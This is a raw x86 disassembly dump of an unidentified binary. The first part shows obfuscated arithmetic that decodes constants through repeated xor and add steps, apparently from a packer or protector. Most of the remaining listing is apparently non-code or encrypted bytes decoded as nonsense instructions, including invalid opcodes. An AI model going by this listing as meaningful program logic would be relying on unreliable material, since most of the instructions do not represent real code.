  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423b64
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423b20
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41e97f
  41e9f3:	push   esi
  41e9f4:	shl    BYTE PTR [eax+0x6261da13],1
  41e9fa:	push   ecx
  41e9fb:	pop    edi
  41e9fc:	bound  esp,QWORD PTR [edx+0x68]
  41e9ff:	pushf  
  41ea00:	enter  0xef0f,0x33
  41ea04:	call   0xfd08:0x9c058ab5
  41ea0b:	sahf   
  41ea0c:	mov    es,WORD PTR [edi-0x3a]
  41ea0f:	xlat   BYTE PTR ds:[ebx]
  41ea10:	sub    edi,edi
  41ea12:	cld    
  41ea13:	xchg   ecx,eax
  41ea14:	std    
  41ea15:	fldcw  WORD PTR [ecx]
  41ea17:	or     BYTE PTR ds:0x20d93cb0,ch
  41ea1d:	sysenter 
  41ea1f:	cmp    al,0x2e
  41ea22:	aaa    
  41ea23:	shr    dh,cl
  41ea25:	xchg   ebx,eax
  41ea26:	cli    
  41ea27:	or     dh,BYTE PTR [ebx+0x2a]
  41ea2a:	or     edi,eax
  41ea2c:	or     eax,0x860d53ac
  41ea31:	jp     0x41e9e1
  41ea33:	out    dx,al
  41ea34:	adc    eax,DWORD PTR [eax]
  41ea36:	and    BYTE PTR [ebp+0x48],0x86
  41ea3a:	mov    eax,ds:0x53b30088
  41ea3f:	and    cl,BYTE PTR [esi+esi*2+0x58]
  41ea43:	mov    WORD PTR [edx],ss
  41ea45:	mov    cl,0xdc
  41ea47:	mov    bl,0xb3
  41ea49:	adc    BYTE PTR [ebx+0xb393bb2],bl
  41ea4f:	cmp    eax,0x7058dd5f
  41ea55:	mov    esi,0x3fa6eef0
  41ea5a:	pop    ebx
  41ea5b:	rol    DWORD PTR [esi+0x6],cl
  41ea5e:	sub    eax,0xf12cd3c4
  41ea63:	mov    ecx,0x6e8a564a
  41ea68:	aaa    
  41ea69:	sub    eax,0xa73dad39
  41ea6e:	lods   al,BYTE PTR ds:[esi]
  41ea6f:	es push ecx
  41ea71:	xor    ebx,DWORD PTR [eax-0x76]
  41ea74:	out    0x4b,eax
  41ea76:	pushf  
  41ea77:	cmp    eax,DWORD PTR [ebp-0x16786029]
  41ea7d:	leave  
  41ea7e:	mov    ebp,0xe5bed7df
  41ea83:	fidiv  DWORD PTR cs:[edx+0x37]
  41ea87:	push   0x2a
  41ea89:	cmp    BYTE PTR [eax+ecx*2+0x6a2ee68e],al
  41ea90:	inc    edi
  41ea91:	inc    ebp
  41ea92:	repz sub cl,BYTE PTR [edx-0x5f]
  41ea96:	sub    edi,esi
  41ea98:	mov    edi,0x5b9699a1
  41ea9d:	mov    ch,0xd4
  41ea9f:	pop    ds
  41eaa0:	push   cs
  41eaa1:	int3   
  41eaa2:	lahf   
  41eaa3:	cmp    ch,BYTE PTR [edi-0x68]
  41eaa6:	jne    0x41eae4
  41eaa8:	xchg   esi,eax
  41eaa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaaa:	sbb    BYTE PTR [eax-0x81fb04c],cl
  41eab0:	gs xchg esi,eax
  41eab2:	mov    ah,0xa9
  41eab4:	test   BYTE PTR [eax+0x5e],0x29
  41eab8:	rcl    DWORD PTR cs:[esi+0x7a],1
  41eabc:	repz xchg ebp,eax
  41eabe:	fisttp WORD PTR [edx-0x21]
  41eac1:	retf   0x91da
  41eac4:	dec    ebx
  41eac5:	adc    al,0x1
  41eac7:	mov    ds:0xeb0b65ad,eax
  41eacc:	sar    edi,1
  41eace:	inc    BYTE PTR [ebx]
  41ead0:	out    0x4f,al
  41ead2:	mov    edx,0x88248ce4
  41ead7:	scas   eax,DWORD PTR es:[edi]
  41ead8:	pop    es
  41ead9:	pop    ax
  41eadb:	push   ss
  41eadc:	ss xor eax,edi
  41eadf:	xchg   esp,eax
  41eae0:	cld    
  41eae1:	inc    eax
  41eae2:	mov    ebx,0x48ca3a46
  41eae7:	mov    ah,0x34
  41eae9:	sub    ebp,DWORD PTR [ebp+0x33]
  41eaec:	xchg   esp,eax
  41eaed:	in     al,dx
  41eaee:	das    
  41eaef:	pop    ebp
  41eaf0:	out    dx,al
  41eaf1:	pop    ds
  41eaf2:	shr    ecx,0x0
  41eaf5:	test   DWORD PTR [esi],edx
  41eaf7:	loop   0x41ea7b
  41eaf9:	fcomp  QWORD PTR [esi+0x3993e7ba]
  41eaff:	stos   BYTE PTR es:[edi],al
  41eb00:	test   cl,cl
  41eb02:	xchg   edi,eax
  41eb03:	pushw  ss
  41eb05:	jno    0x41eaa4
  41eb07:	inc    esi
  41eb08:	fist   DWORD PTR [ebp-0x17]
  41eb0b:	and    eax,0x2d1e512d
  41eb10:	aaa    
  41eb11:	inc    edx
  41eb12:	push   0xb4e9d102
  41eb17:	xchg   ebp,eax
  41eb18:	loope  0x41eb69
  41eb1a:	cmp    eax,0x3d47b3f
  41eb1f:	ins    BYTE PTR es:[edi],dx
  41eb20:	mov    ebx,0x1a05c7e1
  41eb25:	in     eax,dx
  41eb26:	inc    ebx
  41eb27:	push   edi
  41eb28:	cmp    BYTE PTR [eax+0x23],bh
  41eb2b:	mov    ebx,0xba77de58
  41eb30:	cmp    BYTE PTR [edx+esi*1-0x6b],cl
  41eb34:	in     eax,0x5e
  41eb36:	jg     0x41ead0
  41eb38:	clc    
  41eb39:	or     bl,0xc0
  41eb3c:	ja     0x41eac9
  41eb3e:	mov    ecx,0x8bdfa215
  41eb43:	and    DWORD PTR [edx],ecx
  41eb45:	cwde   
  41eb46:	std    
  41eb47:	test   DWORD PTR [edx+0x7623be02],ebp
  41eb4d:	scas   al,BYTE PTR es:[edi]
  41eb4e:	push   ebx
  41eb4f:	inc    ebx
  41eb50:	xchg   ebx,eax
  41eb51:	dec    ebx
  41eb52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb53:	xor    bl,BYTE PTR [ebp+0x2885bb7b]
  41eb59:	leave  
  41eb5a:	call   FWORD PTR [ebp+0x3c5221d4]
  41eb60:	loop   0x41ebbd
  41eb62:	(bad)  
  41eb63:	call   0x3012:0x6672aa10
  41eb6a:	lods   eax,DWORD PTR ds:[esi]
  41eb6b:	mov    esi,ecx
  41eb6d:	inc    esi
  41eb6e:	mov    eax,0x7474e015
  41eb73:	fs mov ch,0xa3
  41eb76:	test   DWORD PTR [edi],0x38822886
  41eb7c:	loop   0x41eb5d
  41eb7e:	sbb    ch,BYTE PTR [edi]
  41eb80:	xchg   ebx,eax
  41eb81:	and    DWORD PTR [ebp-0x671025ab],eax
  41eb87:	mov    bl,0xf9
  41eb89:	loope  0x41eb96
  41eb8b:	adc    DWORD PTR [ebx+0x6b],eax
  41eb8e:	nop
  41eb8f:	add    edx,0xc00151c8
  41eb95:	and    DWORD PTR [esi-0x42],esp
  41eb98:	push   cs
  41eb99:	in     al,dx
  41eb9a:	sub    cl,BYTE PTR [esi+0x7e]
  41eb9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb9e:	sub    BYTE PTR [ebx],cl
  41eba0:	add    dh,al
  41eba2:	jmp    0xbc97:0x8aa637f5
  41eba9:	out    0xcf,al
  41ebab:	les    esp,FWORD PTR [eax]
  41ebad:	or     BYTE PTR [ebx+0x2],0xd6
  41ebb1:	ss push edx
  41ebb3:	mov    ch,0x44
  41ebb5:	or     al,0x1a
  41ebb7:	out    0x23,al
  41ebb9:	xchg   edx,eax
  41ebba:	or     al,0xdf
  41ebbc:	inc    edx
  41ebbd:	aaa    
  41ebbe:	mov    dh,0x8d
  41ebc0:	sar    BYTE PTR [ebx],0x5
  41ebc3:	pop    es
  41ebc4:	add    bl,BYTE PTR [ecx-0x4150d147]
  41ebca:	stc    
  41ebcb:	lahf   
  41ebcc:	push   esp
  41ebcd:	mov    al,0xab
  41ebcf:	xchg   DWORD PTR [eax-0x1313d49],ebp
  41ebd5:	add    ebx,esp
  41ebd7:	cmp    BYTE PTR [ecx-0x418da7af],ah
  41ebdd:	adc    al,0x8b
  41ebdf:	outs   dx,BYTE PTR ds:[esi]
  41ebe0:	inc    esp
  41ebe1:	add    eax,ebp
  41ebe3:	mov    ah,0x9
  41ebe5:	pop    ecx
  41ebe6:	push   esi
  41ebe7:	fisttp DWORD PTR [ebp-0x64]
  41ebea:	xor    esi,DWORD PTR [edx]
  41ebec:	and    bl,BYTE PTR [ecx+ebp*2+0xb23c72f]
  41ebf3:	out    dx,eax
  41ebf4:	sub    esp,DWORD PTR [ecx]
  41ebf6:	out    0x2c,al
  41ebf8:	out    0x50,eax
  41ebfa:	enter  0x871e,0xbf
  41ebfe:	shr    BYTE PTR [eax+0x59b6fc67],1
  41ec04:	(bad)  
  41ec05:	sub    edx,esp
  41ec07:	mov    dh,0xd
  41ec09:	mov    al,ds:0x3c76092f
  41ec0e:	pushf  
  41ec0f:	xchg   ebx,eax
  41ec10:	push   edx
  41ec11:	push   ecx
  41ec12:	sub    DWORD PTR [edi+0x4f],eax
  41ec15:	inc    ecx
  41ec16:	je     0x41ebf0
  41ec18:	and    eax,0x2d73dd6d
  41ec1d:	pusha  
  41ec1e:	pop    ecx
  41ec1f:	jne    0x41eba5
  41ec21:	es aam 0x9a
  41ec24:	test   eax,0x612bdea
  41ec29:	push   ss
  41ec2a:	xchg   BYTE PTR [edi],bh
  41ec2c:	je     0x41ec96
  41ec2e:	ins    DWORD PTR es:[edi],dx
  41ec2f:	rcr    BYTE PTR [edx-0x51],1
  41ec32:	cdq    
  41ec33:	(bad)  
  41ec34:	mov    esi,0xbcad2601
  41ec39:	sbb    esi,edx
  41ec3b:	repz fmul st,st(0)
  41ec3e:	(bad)  
  41ec3f:	aam    0xff
  41ec41:	aas    
  41ec42:	xchg   edi,eax
  41ec43:	adc    al,0xf6
  41ec45:	add    esi,DWORD PTR [edx-0x30]
  41ec48:	adc    esp,DWORD PTR [edi+0xe]
  41ec4b:	xchg   edi,eax
  41ec4c:	jae    0x41ec69
  41ec4e:	and    dh,BYTE PTR [edx+edx*8+0x18]
  41ec52:	and    BYTE PTR [edx-0x525ff424],cl
  41ec58:	stc    
  41ec59:	xlat   BYTE PTR ds:[ebx]
  41ec5a:	or     al,0xb0
  41ec5c:	mov    al,0xf5
  41ec5e:	sbb    ah,BYTE PTR [edx+edi*4-0x458fb596]
  41ec65:	fwait
  41ec66:	out    dx,eax
  41ec67:	cmc    
  41ec68:	cli    
  41ec69:	rcr    BYTE PTR [esp+edx*4+0x2672166f],cl
  41ec70:	(bad)  
  41ec71:	mov    ebp,0xe6f7115e
  41ec76:	daa    
  41ec77:	jmp    0x7935:0x8dbc5f59
  41ec7e:	shld   DWORD PTR ds:0x501a510c,esp,cl
  41ec85:	pop    edx
  41ec86:	cli    
  41ec87:	sahf   
  41ec88:	and    DWORD PTR [eax+0x76],edx
  41ec8b:	dec    eax
  41ec8c:	outs   dx,BYTE PTR ds:[esi]
  41ec8d:	das    
  41ec8e:	sub    BYTE PTR [edx+0x23],al
  41ec91:	pop    ecx
  41ec92:	push   eax
  41ec93:	les    edi,FWORD PTR [edi+0x5670e355]
  41ec99:	dec    edi
  41ec9a:	aas    
  41ec9b:	in     eax,dx
  41ec9c:	(bad)  
  41ec9d:	push   ds
  41ec9e:	arpl   bp,cx
  41eca0:	cmp    al,0x5b
  41eca2:	inc    edi
  41eca3:	adc    al,0xf9
  41eca5:	push   ebx
  41eca6:	jno    0x41ec35
  41eca8:	mov    dl,0xdd
  41ecaa:	push   ss
  41ecab:	fld    QWORD PTR [ebx]
  41ecad:	cmp    al,0xf0
  41ecaf:	mov    dl,0x55
  41ecb1:	daa    
  41ecb2:	adc    BYTE PTR [edx-0x67],al
  41ecb5:	sbb    bh,BYTE PTR [ebx]
  41ecb7:	xchg   BYTE PTR [esi-0x5f],dh
  41ecba:	icebp  
  41ecbb:	dec    edi
  41ecbc:	mov    fs,WORD PTR [ebx]
  41ecbe:	cmp    BYTE PTR [ebx-0x501a39d],cl
  41ecc4:	lds    ebx,FWORD PTR [esi-0x6e12a82a]
  41ecca:	jmp    0x41ec79
  41eccc:	cs cmp eax,0x744195a1
  41ecd2:	stos   DWORD PTR es:[edi],eax
  41ecd3:	adc    ebx,eax
  41ecd5:	hlt    
  41ecd6:	xor    BYTE PTR [edi],dh
  41ecd8:	lea    edx,[ebp+0x741ecc02]
  41ecde:	pop    edi
  41ecdf:	xchg   esp,eax
  41ece0:	leave  
  41ece1:	inc    eax
  41ece2:	pop    edi
  41ece3:	sti    
  41ece4:	push   0xffffffaa
  41ece6:	xchg   esp,eax
  41ece7:	int3   
  41ece8:	and    dh,BYTE PTR [esi-0x4683905d]
  41ecee:	js     0x41eca6
  41ecf0:	pop    ds
  41ecf1:	loopne 0x41ecaa
  41ecf3:	js     0x41eca1
  41ecf5:	and    eax,0x4a4a9f5c
  41ecfa:	or     eax,0x9cb12573
  41ecff:	and    al,0xaf
  41ed01:	popa   
  41ed02:	jbe    0x41ec9e
  41ed04:	cmp    esp,esi
  41ed06:	push   ds
  41ed07:	mov    al,0x7f
  41ed09:	mov    BYTE PTR [ecx-0x41408b5d],al
  41ed0f:	outs   dx,BYTE PTR ds:[esi]
  41ed10:	int    0xd6
  41ed12:	cmp    edi,ebp
  41ed14:	pop    ss
  41ed15:	xchg   ecx,eax
  41ed16:	mov    dl,0xba
  41ed18:	stos   DWORD PTR es:[edi],eax
  41ed19:	or     BYTE PTR [edi+edx*2],0xce
  41ed1d:	int3   
  41ed1e:	sbb    BYTE PTR [ebx+0x601ddc11],bl
  41ed24:	aas    
  41ed25:	lock pop esp
  41ed27:	cmp    edx,DWORD PTR [ecx+0x2c007d97]
  41ed2d:	pop    esp
  41ed2e:	adc    DWORD PTR [ebp+ebp*8-0x70938d0e],ebx
  41ed35:	mov    BYTE PTR [ebx+0x62],0xf1
  41ed39:	sub    bh,BYTE PTR [eax]
  41ed3b:	xlat   BYTE PTR ds:[ebx]
  41ed3c:	xchg   ebx,eax
  41ed3d:	stos   DWORD PTR es:[edi],eax
  41ed3e:	nop
  41ed3f:	sub    ah,BYTE PTR [edx-0x72]
  41ed42:	outs   dx,BYTE PTR ds:[esi]
  41ed43:	cld    
  41ed44:	outs   dx,DWORD PTR ds:[esi]
  41ed45:	les    ecx,FWORD PTR [esi+0x5d918ed8]
  41ed4b:	std    
  41ed4c:	retf   
  41ed4d:	and    eax,0x368cc136
  41ed52:	xchg   edx,eax
  41ed53:	add    BYTE PTR [edx+0x3d17791a],bh
  41ed59:	sbb    al,BYTE PTR [edi]
  41ed5b:	loopne 0x41ed6e
  41ed5d:	(bad)  
  41ed5e:	jle    0x41edba
  41ed60:	sub    ah,dl
  41ed62:	leave  
  41ed63:	sub    eax,0xb4b91f1
  41ed68:	loop   0x41ecf8
  41ed6a:	out    dx,eax
  41ed6b:	out    dx,al
  41ed6c:	and    ebp,DWORD PTR [eax-0xcf6059e]
  41ed72:	shl    DWORD PTR ds:0xaa4d7abb,0xe9
  41ed79:	in     eax,0x9e
  41ed7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed7c:	jle    0x41ed76
  41ed7e:	outs   dx,DWORD PTR ds:[esi]
  41ed7f:	or     esp,DWORD PTR ds:0xf355813e
  41ed85:	inc    eax
  41ed86:	pop    eax
  41ed87:	pop    ds
  41ed88:	mov    eax,ds:0xe17ed7d6
  41ed8d:	mov    esp,DWORD PTR [eax+0x5c9850fd]
  41ed93:	lds    eax,FWORD PTR [edx-0x7f]
  41ed96:	mov    ebp,0x83b096a4
  41ed9b:	and    dl,cl
  41ed9d:	(bad)  
  41ed9f:	sub    ah,BYTE PTR [ebp+0xb]
  41eda2:	xor    al,0x77
  41eda4:	cmp    eax,0x67e26416
  41eda9:	inc    ebx
  41edaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edab:	call   0xfc14:0x9637abc5
  41edb2:	push   ecx
  41edb3:	pop    ebp
  41edb4:	dec    ebp
  41edb5:	jl     0x41ee07
  41edb7:	out    dx,eax
  41edb8:	push   edi
  41edb9:	push   cs
  41edba:	and    bl,al
  41edbc:	and    bl,bh
  41edbe:	inc    esi
  41edbf:	ds push esp
  41edc1:	rcl    BYTE PTR [ebx+0x41ffea9c],cl
  41edc7:	loope  0x41ed51
  41edc9:	test   eax,0xbd8ae2c
  41edce:	fdivrp st(1),st
  41edd0:	out    dx,eax
  41edd1:	jns    0x41edf2
  41edd3:	lds    esi,FWORD PTR [esi+0x77]
  41edd6:	hlt    
  41edd7:	pop    ds
  41edd8:	pop    edx
  41edd9:	xor    esi,DWORD PTR [esi]
  41eddb:	test   DWORD PTR [ecx+0x13],0x87501358
  41ede2:	jnp    0x41ee46
  41ede4:	scas   eax,DWORD PTR es:[edi]
  41ede5:	sbb    dh,BYTE PTR [edx]
  41ede7:	jb     0x41edb4
  41ede9:	pop    eax
  41edeb:	push   esp
  41eded:	enter  0x8dbb,0xbd
  41edf1:	stos   BYTE PTR es:[edi],al
  41edf2:	fst    DWORD PTR [esi]
  41edf4:	push   ebp
  41edf5:	cmc    
  41edf6:	aaa    
  41edf7:	in     al,0xeb
  41edf9:	(bad)  
  41edfa:	(bad)  
  41edfb:	daa    
  41edfc:	ret    
  41edfd:	mov    al,ds:0xb8f3ccbf
  41ee02:	or     DWORD PTR [edx-0x14],esi
  41ee05:	loop   0x41ee18
  41ee07:	mov    ah,0xf6
  41ee09:	pop    ebp
  41ee0a:	jmp    0x41ee3b
  41ee0c:	lahf   
  41ee0d:	adc    DWORD PTR [eax-0x6cf2d412],ebp
  41ee13:	jecxz  0x41ee38
  41ee15:	jnp    0x41ee2c
  41ee17:	stc    
  41ee18:	pop    ds
  41ee19:	mov    bl,0x13
  41ee1b:	imul   ebp,DWORD PTR [ebx],0xfffffff3
  41ee1e:	loope  0x41edd8
  41ee20:	mov    DWORD PTR [eax+ecx*8+0x72],ecx
  41ee24:	scas   al,BYTE PTR es:[edi]
  41ee25:	fs or  eax,0xe9bde329
  41ee2b:	test   BYTE PTR [edx-0x58040204],0x54
  41ee32:	into   
  41ee33:	inc    esi
  41ee34:	sbb    dl,BYTE PTR [ebx+0x6c]
  41ee37:	sar    DWORD PTR [edx+0x29],0x2e
  41ee3b:	push   cs
  41ee3c:	mov    WORD PTR [ebp-0x3b2e840d],cs
  41ee42:	adc    DWORD PTR [ecx],esi
  41ee44:	je     0x41ee2c
  41ee46:	add    eax,0x7e8678cb
  41ee4b:	fsin   
  41ee4d:	fs dec ebp
  41ee4f:	sub    eax,0x199c9291
  41ee54:	push   edi
  41ee55:	test   eax,0x15d7dd4e
  41ee5a:	mov    ebp,0x91930dae
  41ee5f:	sbb    BYTE PTR [esi-0x1b7d58bc],ah
  41ee65:	xor    edi,DWORD PTR [ecx+eiz*1-0x198bc288]
  41ee6c:	inc    ecx
  41ee6d:	retf   0xcf02
  41ee70:	push   esi
  41ee71:	sahf   
  41ee72:	add    BYTE PTR [ebp-0x13b6c659],bh
  41ee78:	mov    dl,BYTE PTR [ebx+ecx*8+0x5]
  41ee7c:	das    
  41ee7d:	jnp    0x41ee0d
  41ee7f:	or     esp,eax
  41ee81:	and    BYTE PTR [edi-0x5d],bh
  41ee84:	daa    
  41ee85:	imul   esp,DWORD PTR [edi+0x50991763],0xca18dd50
  41ee8f:	xchg   esi,eax
  41ee90:	pop    ss
  41ee91:	sub    DWORD PTR [esi+0x2e49f4ee],esp
  41ee97:	test   al,0x34
  41ee99:	outs   dx,DWORD PTR ds:[esi]
  41ee9a:	bound  edx,QWORD PTR fs:[edx-0x6e3e18d2]
  41eea1:	cmp    DWORD PTR [eax+0x63ae62],esp
  41eea7:	fisubr WORD PTR [ebx+0x705f874c]
  41eead:	push   ecx
  41eeae:	cmc    
  41eeaf:	out    0x12,al
  41eeb1:	enter  0xc7a3,0xa3
  41eeb5:	scas   eax,DWORD PTR es:[edi]
  41eeb6:	je     0x41ee3e
  41eeb8:	imul   ebx,DWORD PTR [edi+0x1a],0x31bc3d23
  41eebf:	dec    ebp
  41eec0:	push   eax
  41eec1:	shr    BYTE PTR [ebx+0x79c08e3e],0x6a
  41eec8:	xor    bh,BYTE PTR [esi+0x26]
  41eecb:	adc    al,0xbf
  41eecd:	in     al,dx
  41eece:	jge    0x41ee87
  41eed0:	mov    al,ds:0x17c5564
  41eed5:	imul   ebx,DWORD PTR [ecx+0x68122a2b],0x86234b29
  41eedf:	int3   
  41eee0:	das    
  41eee1:	or     eax,0xa55fc40c
  41eee6:	call   DWORD PTR gs:[ecx-0x31ede27c]
  41eeed:	std    
  41eeee:	xchg   DWORD PTR [eax-0x51],ebp
  41eef1:	pop    eax
  41eef2:	(bad)  [ebx]
  41eef4:	sub    eax,0xc81313b1
  41eef9:	les    ebx,FWORD PTR [esi+edi*4-0x70]
  41eefd:	cmp    eax,edx
  41eeff:	mov    eax,0x76c8f4e2
  41ef04:	jbe    0x41eee6
  41ef06:	mov    eax,ds:0xc258b71
  41ef0b:	popf   
  41ef0c:	mov    esi,0x514a36
  41ef11:	adc    esp,ebp
  41ef13:	push   ebp
  41ef14:	mov    BYTE PTR [ecx],0x65
  41ef17:	cmp    DWORD PTR [ebx],0x42
  41ef1a:	mov    ecx,0x9ba48867
  41ef1f:	out    0xc8,eax
  41ef21:	dec    eax
  41ef22:	cli    
  41ef23:	xchg   esp,eax
  41ef24:	imul   ebp,DWORD PTR [eax],0xffffffe3
  41ef27:	and    al,0x53
  41ef29:	cmp    BYTE PTR [edi+0x6d],bl
  41ef2c:	js     0x41ef0b
  41ef2e:	jae    0x41eed7
  41ef30:	jmp    0x41ef45
  41ef32:	mov    ?,WORD PTR [eax-0x1902b577]
  41ef38:	pushf  
  41ef39:	and    eax,0xb325ec6b
  41ef3e:	inc    ecx
  41ef3f:	std    
  41ef40:	jno    0x41eefe
  41ef42:	out    dx,eax
  41ef43:	adc    al,0xbe
  41ef45:	jb     0x41ef2b
  41ef47:	sub    bh,BYTE PTR [edx]
  41ef49:	test   BYTE PTR [esi-0xa97022d],al
  41ef4f:	add    bh,BYTE PTR [edi-0x2e]
  41ef52:	cwde   
  41ef53:	leave  
  41ef54:	pop    ecx
  41ef55:	adc    edx,DWORD PTR [ecx+edx*8+0x74]
  41ef59:	fwait
  41ef5a:	mov    esp,0xa63b4b6f
  41ef5f:	ror    DWORD PTR [esi-0x28],0x98
  41ef63:	inc    edi
  41ef64:	adc    edx,DWORD PTR [esi+0x67]
  41ef67:	popf   
  41ef68:	(bad)  
  41ef69:	and    dh,cl
  41ef6b:	pusha  
  41ef6c:	push   0x17
  41ef6e:	imul   ebp,DWORD PTR [ebp+0x7c],0xffffff9b
  41ef72:	or     DWORD PTR ds:[esi+0xbdea378],ecx
  41ef79:	(bad)  
  41ef7a:	mov    ecx,0x45433d4a
  41ef7f:	pop    ds
  41ef80:	dec    edi
  41ef81:	scas   eax,DWORD PTR es:[edi]
  41ef82:	xchg   esp,eax
  41ef83:	adc    eax,0xe59869c8
  41ef88:	ret    
  41ef89:	not    BYTE PTR ds:0x39bc916f
  41ef8f:	push   ss
  41ef90:	add    DWORD PTR [ebx],esi
  41ef92:	inc    edx
  41ef93:	aad    0xca
  41ef95:	dec    ecx
  41ef96:	fcmovbe st,st(7)
  41ef98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef99:	or     bl,ah
  41ef9b:	in     eax,dx
  41ef9c:	aaa    
  41ef9d:	push   ss
  41ef9e:	xor    eax,0x96c62412
  41efa3:	repnz cmp al,0x4f
  41efa6:	push   esp
  41efa7:	in     al,0x92
  41efa9:	test   ebx,0x89c52b6a
  41efaf:	lahf   
  41efb0:	pop    eax
  41efb1:	mov    edi,0x2dfbcfb5
  41efb6:	int3   
  41efb7:	dec    edx
  41efb8:	(bad)  [ebx-0x3d]
  41efbb:	ss (bad) 
  41efbf:	xchg   ecx,esp
  41efc1:	push   ss
  41efc2:	lods   eax,DWORD PTR ds:[esi]
  41efc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efc4:	add    bh,dh
  41efc6:	out    dx,eax
  41efc7:	dec    eax
  41efc8:	fld    TBYTE PTR ds:[edi-0x14]
  41efcc:	xor    al,0x41
  41efce:	cmp    al,0x5b
  41efd0:	mov    DWORD PTR [ecx+0x4e],ebp
  41efd3:	dec    ecx
  41efd4:	jmp    0xedb7:0xaf2c5da7
  41efdb:	mov    esp,0x2fe1c05e
  41efe0:	lods   eax,DWORD PTR ds:[esi]
  41efe1:	test   DWORD PTR [ebx],esi
  41efe3:	and    ch,BYTE PTR ds:0x413f24fc
  41efe9:	test   BYTE PTR [ebx],bh
  41efeb:	xchg   edi,eax
  41efec:	sar    BYTE PTR [edi-0x7c9d9887],1
  41eff2:	cmp    al,0x34
  41eff4:	or     eax,0x3080e6d1
  41eff9:	enter  0x62cd,0xff
  41effd:	sbb    edi,edx
  41efff:	xlat   BYTE PTR ds:[ebx]
  41f000:	or     al,0x0
  41f002:	inc    ebp
  41f003:	mov    edx,0x6cba177c
  41f008:	cdq    
  41f009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f00a:	cs clc 
  41f00c:	or     bp,WORD PTR [edx-0x9]
  41f010:	cmp    ebp,DWORD PTR [eax]
  41f012:	xchg   ebx,eax
  41f013:	ds jge 0x41f00d
  41f016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f017:	adc    BYTE PTR [eax],al
  41f019:	jle    0x41f016
  41f01b:	(bad)  
  41f01c:	lea    ebx,ds:[edx+0x113ef46e]
  41f023:	pop    es
  41f024:	jns    0x41efd8
  41f026:	cmp    edx,DWORD PTR [eax-0x5bbb2ec5]
  41f02c:	repz aas 
  41f02e:	cld    
  41f02f:	push   0x18e77e72
  41f034:	pop    ds
  41f035:	mov    al,0x18
  41f037:	push   edx
  41f038:	and    eax,0x5fba89ea
  41f03d:	lds    esi,FWORD PTR [edx]
  41f03f:	retf   0x9843
  41f042:	push   ebp
  41f043:	xor    BYTE PTR [edi+0x29ca10f4],ch
  41f049:	into   
  41f04a:	stos   BYTE PTR es:[edi],al
  41f04b:	xor    DWORD PTR ds:0x43e09c38,esp
  41f051:	sbb    DWORD PTR [ebp+0x1e10ed52],0x31
  41f058:	xchg   ebp,eax
  41f059:	clc    
  41f05a:	(bad)  
  41f05b:	sub    al,0xbb
  41f05d:	cld    
  41f05e:	add    al,bl
  41f060:	shl    DWORD PTR [esi+edi*1+0x75],0x99
  41f065:	mov    al,0xf1
  41f067:	call   0x9776:0x2e6ed9f3
  41f06e:	fsub   DWORD PTR [eax]
  41f070:	and    bl,BYTE PTR [edi]
  41f072:	xlat   BYTE PTR ds:[ebx]
  41f073:	or     eax,0x2e75af84
  41f078:	jp     0x41f084
  41f07a:	addr16 push ds
  41f07c:	inc    ecx
  41f07d:	mov    cl,0x39
  41f07f:	push   edx
  41f080:	cli    
  41f081:	fild   DWORD PTR [ebx-0x13]
  41f084:	cmp    bl,BYTE PTR [edx+eax*8+0x774aa843]
  41f08b:	jns    0x41f015
  41f08d:	sub    DWORD PTR [esi+0x56],edi
  41f090:	adc    DWORD PTR [eax],edi
  41f092:	jnp    0x41f10f
  41f094:	fnstcw WORD PTR [eax]
